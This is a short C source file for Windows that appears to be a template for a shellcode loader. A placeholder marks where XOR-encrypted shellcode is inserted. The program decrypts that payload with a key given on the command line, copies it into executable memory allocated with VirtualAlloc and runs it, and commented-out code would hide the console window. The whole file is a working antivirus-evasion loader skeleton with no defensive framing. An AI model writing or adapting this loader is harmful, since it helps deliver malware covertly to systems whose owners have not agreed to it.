#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

ENCRYPTED_SHELLCODE_POINT

static unsigned char *xor_func(unsigned char *buf, size_t mlen, unsigned char *key) {
    size_t keylen = strlen(key);
    printf("Keylen: %d", keylen);

    unsigned char *enc = (unsigned char *) malloc(mlen + 1);
    memset(enc, 0, mlen + 1);

    int i;
    for(i = 0; i < mlen; i++) {
        enc[i] = buf[i] ^ key[i % keylen];
    }

    return enc;
}

int main(int argc, char* argv[]) {
//    HWND console;
//    AllocConsole();
//    console = FindWindowA("consoleWindowClass", NULL);
//    ShowWindow(console, SW_HIDE);

    printf("Shellcode Length: %d\n", sizeof(shellcode)-1);

    printf("Entered key: %s\n", argv[1]);

    int shellcode_len = sizeof(shellcode)-1;
    unsigned char *decrypted_shellcode = xor_func(shellcode, shellcode_len, argv[1]);

    void *exec = VirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, decrypted_shellcode, shellcode_len);
    ((void(*)())exec)();

    return 0;
}
